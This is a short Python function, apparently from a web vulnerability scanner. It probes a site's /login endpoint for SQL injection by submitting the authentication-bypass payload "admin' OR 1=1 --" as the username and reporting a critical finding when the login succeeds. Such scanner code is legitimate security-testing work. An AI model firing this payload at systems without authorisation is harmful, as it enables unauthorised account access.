import requests
from urllib.parse import urljoin
from reporting import report_finding


def test_sql_injection(base_url):
    print(f"\nTesting {base_url} for SQL Injection...\n")

    login_url = urljoin(base_url, "/login")

    try:
        # Step 1: Normal login attempt
        normal_data = {
            "username": "randomuser",
            "password": "randompass"
        }

        normal_response = requests.post(login_url, data=normal_data, timeout=5)
        normal_text = normal_response.text

        # Step 2: Injection attempt
        injection_data = {
            "username": "admin' OR 1=1 --",
            "password": "anything"
        }

        injected_response = requests.post(login_url, data=injection_data, timeout=5)
        injected_text = injected_response.text

        # Step 3: Boolean comparison
        if "Welcome" in injected_text and "Invalid credentials" in normal_text:
            report_finding(
                target=login_url,
                vuln_type="SQL Injection",
                severity="CRITICAL",
                details="Login bypass detected using payload: admin' OR 1=1 --"
            )
            print("[!] SQL Injection detected via login bypass!")
        else:
            print("[-] No SQL Injection detected.")

    except Exception as e:
        print(f"Error testing SQL injection: {e}")